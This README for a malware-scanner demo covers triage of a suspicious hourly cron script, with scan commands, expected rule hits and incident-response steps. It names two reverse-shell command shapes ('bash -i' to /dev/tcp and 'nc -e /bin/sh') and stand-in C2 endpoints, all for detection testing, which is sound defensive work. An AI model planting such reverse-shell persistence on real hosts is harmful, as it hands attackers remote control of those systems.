# Demo 06 — Reverse-shell persistence in a cron job

## Context (defensive / authorized triage)

During a Linux host review, an analyst notices a new script under
`/etc/cron.hourly`. They want to confirm it is a callback/backdoor before
escalating. `cron_backdoor.sh` carries two well-known reverse-shell patterns:
a `bash -i >& /dev/tcp/<ip>/<port>` redirector and an `nc -e /bin/sh`
fallback.

The C2 endpoints are deliberately non-routable: `198.51.100.23` is an
RFC 5737 documentation address and `c2.attacker.invalid` uses the reserved
`.invalid` TLD. The detection signal — the command shapes — is real.

## Run it

```
python -m yararun scan demos/06-reverse-shell/cron_backdoor.sh
python -m yararun --format json scan demos/06-reverse-shell/cron_backdoor.sh
```

## Expected

- `Shell_Reverse_Connect` fires at severity **critical** (the `nc -e` marker
  alone satisfies the rule; the `bash -i` + `/dev/tcp/` pair also matches).
- `Suspicious_URL` may fire on the hardcoded IP endpoint.
- Exit code `1`.

## How to act

Snapshot the cron unit and its timestamps, hunt for the same `/dev/tcp/` and
`nc -e` patterns across `/etc/cron.*`, systemd timers, and shell rc files,
block the C2 IP/host at egress, and rotate any keys/credentials present on the
host. Add the host to the IR scope.
